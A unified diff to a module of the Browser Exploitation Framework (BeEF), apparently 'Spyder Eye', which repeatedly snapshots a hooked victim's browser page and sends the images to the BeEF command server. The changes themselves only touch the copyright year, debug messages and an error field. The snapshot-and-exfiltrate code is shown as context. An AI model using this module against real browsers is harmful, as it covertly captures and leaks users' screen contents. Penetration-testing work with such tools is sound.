@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -15,17 +15,17 @@ beef.execute(function() {
 	    		var d = canvas.toDataURL('image/png');
 	    		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'image=' + d );
 	    	});
-
-	    	beef.debug('[Spyder_Eye] html2canvas hasn\'t failed, that\'s something');
+	    	beef.debug('[Spyder Eye] Took snapshot successfully');
 	    }
 	    catch (e) {
-	    	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Obtaining snapshot failed: ' + e.message);
+		beef.debug('[Spyder Eye] Obtaining snapshot failed: ' + e.message);
+	    	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Obtaining snapshot failed: ' + e.message);
 	    }
 	};
 
 	takeit = function() {
 		for(var i = 0; i < takes; i++) {
-			beef.debug('[Spyder_Eye] Taking ' + i + '. snapshot');
+			beef.debug('[Spyder Eye] Taking snapshot #' + i);
 			setTimeout(snap, delay * i);
 		}
 	};
